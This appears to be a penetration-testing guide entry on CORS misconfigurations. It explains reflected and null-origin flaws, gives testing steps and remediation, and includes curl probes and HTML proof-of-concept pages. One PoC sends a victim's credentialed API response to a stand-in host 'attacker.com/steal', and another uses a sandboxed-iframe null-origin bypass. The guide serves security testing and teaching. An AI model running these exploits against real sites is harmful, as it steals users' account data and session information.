# CORS Wildcard or Null Origin

## Overview
Cross-Origin Resource Sharing (CORS) headers control which origins can read responses from an API. A misconfigured CORS policy that reflects arbitrary origins or allows `null` origin enables cross-site reads of sensitive data — allowing an attacker's page to make authenticated requests to the API on behalf of a logged-in user and read the response. This circumvents the Same-Origin Policy (SOP).

## How It Works
- The server checks the `Origin` header and mirrors it back in `Access-Control-Allow-Origin` without a whitelist.
- With `Access-Control-Allow-Credentials: true` and a reflected origin, the attacker's page can read authenticated API responses.
- `null` origin bypass: sandboxed iframes and some redirect chains send `Origin: null` — if the server allows `null` origin with credentials, attackers can exploit this via `<iframe sandbox="allow-scripts">`.
- Wildcard `*` without credentials allows reading unauthenticated responses but not cookies.

## Impact
- Credential theft by reading auth tokens from API responses.
- Account data exfiltration (emails, addresses, payment methods).
- CSRF-equivalent: performing authenticated actions and reading results.
- Complete account takeover via stolen session data.

## Where to Look
- API endpoints that return sensitive data and respond to cross-origin preflight requests.
- REST APIs with authentication via cookies or `Authorization` headers.
- `Access-Control-Allow-Origin` header in API responses.
- Mobile app backends that may have overly permissive CORS for testing.

## Testing Steps
1. Send a request to an API endpoint with `Origin: https://evil.com`.
2. Check if `Access-Control-Allow-Origin: https://evil.com` is returned.
3. If so, check `Access-Control-Allow-Credentials: true` — this is the dangerous combination.
4. Test `Origin: null` for the null origin bypass.
5. Try `Origin: https://nottarget.com`, `Origin: https://target.com.evil.com` (subdomain bypass).
6. Test trusted subdomain takeover: if `sub.target.com` is allowlisted and takeable → CORS bypass.
7. Create a PoC page that makes a cross-origin fetch to the API and reads the response.

## Payloads / Techniques
```bash
# Test CORS with arbitrary origin
curl -s -D - https://api.target.com/user/profile \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=valid_session_token" \
  | grep -i "access-control"

# Test null origin
curl -s -D - https://api.target.com/user/profile \
  -H "Origin: null" \
  -H "Cookie: session=valid_session_token"

# Test subdomain bypass
curl -s -D - https://api.target.com/user/profile \
  -H "Origin: https://target.com.evil.com"
```

```html
<!-- PoC: CORS misconfiguration exploit -->
<html>
<body>
<script>
fetch('https://api.target.com/user/profile', {
  credentials: 'include'  // sends cookies
})
.then(response => response.json())
.then(data => {
  // Exfiltrate sensitive data
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
</body>
</html>

<!-- Null origin bypass PoC -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
  <script>
    fetch('https://api.target.com/profile', {credentials:'include'})
    .then(r=>r.text()).then(d=>parent.postMessage(d,'*'));
  </script>
"></iframe>
<script>
window.onmessage = (e) => { console.log('Exfiltrated:', e.data); }
</script>
```

## Burp Suite Tips
- In **Repeater**, add `Origin: https://evil.com` to any API request and check the response for `Access-Control-Allow-Origin`.
- Use **CORS* (BApp extension)** to automatically scan for CORS misconfigurations across the site.
- Check `Access-Control-Allow-Credentials: true` — this is what makes reflected origin dangerous.
- **Param Miner** (BApp) can identify headers that affect CORS behavior.

## Tools
- Burp Suite Repeater + CORS extension
- corscanner — https://github.com/chenjj/CORScanner (automated CORS misconfiguration scanner)
- curl for manual testing

## Remediation
- Maintain a strict whitelist of allowed origins — never reflect the `Origin` header back without validating it.
- Never combine `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` (browsers block this).
- Treat `null` origin as untrusted — do not include it in the allowlist.
- Validate the full origin string (scheme + host + port) against an allowlist.
- If the API is public and read-only, `Access-Control-Allow-Origin: *` (without credentials) is acceptable.
- Prefer using `SameSite=Strict` cookies to reduce CSRF/CORS cross-contamination.

## References
https://portswigger.net/web-security/cors
https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny
https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
https://cheatsheetseries.owasp.org/cheatsheets/CORS_Cheat_Sheet.html
